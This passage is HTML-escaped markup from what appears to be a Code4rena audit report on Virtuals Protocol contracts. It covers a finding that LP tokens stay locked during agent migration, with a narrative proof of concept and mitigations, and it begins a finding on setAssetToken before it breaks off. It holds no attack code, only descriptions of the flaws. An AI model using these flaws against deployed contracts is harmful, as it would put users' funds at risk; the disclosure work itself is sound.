...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emigrateVirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Stake LP in new veToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentMigrator.sol#L107-L131\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentMigrator.sol#L107-L131\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMeanwhile, the original LP tokens remain locked in the old \u003ccode\u003eveToken\u003c/code\u003e due to the withdrawal restriction in \u003ccode\u003eAgentVeToken.withdraw()\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewithdraw\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient balance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; ((\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematureAt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not mature yet\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L99-L100\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L99-L100\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"impact-16\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-16\" aria-label=\"impact 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eFounders must provide duplicate capital (virtual tokens) during migration, as they cannot retrieve their original LP tokens to retrieve originally deposited virtual tokens in the old uniswap pair.\u003c/li\u003e\n\u003cli\u003eOriginal LP tokens remain locked in obsolete contracts for 10 years. Due to the bonding curve graduation requirements and genesis requirements, the locked virtual token values are significant (roughly 35000 virtual tokens (35000 usd) required to graduate a bonding curve pair).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eModify the AgentMigrator contract to include a mechanism to unlock LP tokens from the old \u003ccode\u003eveToken\u003c/code\u003e during migration.\u003c/li\u003e\n\u003cli\u003eAdd a privileged function to the AgentVeToken contract that allows the founder to withdraw their locked tokens in case of a migration.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"proof-of-concept-16\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eFounder deployed initial bonding curve.\u003c/li\u003e\n\u003cli\u003eIt requires roughly 35000 virtual tokens (35000 usd) to graduate and deploy agent tokens. At graduation, these are converted to LP tokens and locked in the original veToken, with the founder being unable to withdraw the \u003ccode\u003einitialLock\u003c/code\u003e amount.\u003c/li\u003e\n\u003cli\u003eThe protocol team deploys new versions of the Agent contracts and encourages migration.\u003c/li\u003e\n\u003cli\u003eThe founder attempts to migrate their Agent using \u003ccode\u003eAgentMigrator.migrateAgent()\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe founder must transfer additional virtual tokens to the new token contract to create new LP (assuming around the same amount of virtual tokens are required).\u003c/li\u003e\n\u003cli\u003eNew LP tokens are staked in the new \u003ccode\u003eveToken\u003c/code\u003e, but the original LP tokens (worth \u003ccode\u003e~\u003c/code\u003e35,000 usd) remain locked in the old \u003ccode\u003eveToken\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe founder now has capital locked in two places - the new \u003ccode\u003eveToken\u003c/code\u003e (functional) and the old \u003ccode\u003eveToken\u003c/code\u003e (obsolete).\u003c/li\u003e\n\u003cli\u003eThe founder cannot withdraw their original locked LP until after 10 years from the original deployment date.\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-23-using-agentfactorysetassettoken-will-lead-to-loss-of-funds\" style=\"position:relative;\"\u003e\u003ca href=\"#m-23-using-agentfactorysetassettoken-will-lead-to-loss-of-funds\" aria-label=\"m 23 using agentfactorysetassettoken will lead to loss of funds permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-180\"\u003e[M-23] Using \u003ccode\u003eAgentFactory::setAssetToken\u003c/code\u003e will lead to loss of funds\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-729\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L123\"\u003e\u003ccode\u003eAgentFactory::assetToken\u003c/code\u003e\u003c/a\u003e is initially set upon early \u003ccode\u003einitialize\u003c/code\u003e call:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// AgentFactory.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitializer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e__Pausable_init\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenImplementation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenImplementation_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveTokenImplementation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveTokenImplementation_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edaoImplementation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edaoImplementation_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;                       \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Sets assetToken initially\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etbaRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etbaRegistry_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enft_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplicationThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplicationThreshold_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nextId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_grantRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDEFAULT_ADMIN_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_vault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evault_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis \u003ccode\u003eassetToken\u003c/code\u003e is being used inside \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L196\"\u003e\u003ccode\u003eAgentFactory::executeApplication\u003c/code\u003e\u003c/a\u003e, \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L288\"\u003e\u003ccode\u003eAgentFactory::_createNewAgentToken\u003c/code\u003e\u003c/a\u003e and \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L179\"\u003e\u003ccode\u003eAgentFactory::withdraw\u003c/code\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eHowever, changing this \u003ccode\u003eassetToken\u003c/code\u003e via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L388\"\u003e\u003ccode\u003eAgentFactory::setAssetToken\u003c/code\u003e\u003c/a\u003e has serious complications;\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetAssetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDEFAULT_ADMIN_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Sets `assetToken`\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese issues are described below:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca 